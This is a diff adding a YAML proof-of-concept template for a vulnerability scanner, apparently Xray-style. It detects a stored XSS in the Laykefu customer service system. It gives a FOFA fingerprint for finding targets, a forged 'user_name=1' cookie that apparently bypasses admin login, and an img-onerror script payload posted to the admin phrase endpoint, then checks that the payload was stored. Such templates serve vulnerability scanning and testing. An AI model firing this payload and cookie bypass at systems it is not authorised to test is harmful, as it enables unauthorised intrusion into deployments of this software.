@@ -1,0 +1,26 @@
+id: poc-yaml-laykefu-customer-service-system-xss
+info:
+  name: Laykefu客服系统 XSS漏洞
+  severity: medium
+  tags:
+  - xss
+  finger: Laykefu客服系统
+  fofa: icon_hash="-334624619"
+variables:
+  t1: base64(random_str(5))
+requests:
+- method: POST
+  path: /admin/words/addword.html
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Cookie: user_name=1
+  data: content=%3Cimg+src%3Dx+onerror%3Dalert('{{.t1}}')%3B%3E&status=1
+  expression: status_code == 200 && contains(body,"\"msg\":\"添加常用语成功\"") && contains(headers,"application/json")
+- method: GET
+  path: /admin/words/index.html?pageNumber=1&pageSize=1000
+  headers:
+    X-Requested-With: XMLHttpRequest
+    Cookie: user_name=1
+  expression: status_code == 200 && contains(body,"\"content\"") && contains(body,t1)
+    && contains(headers,"application/json")
+transport: http
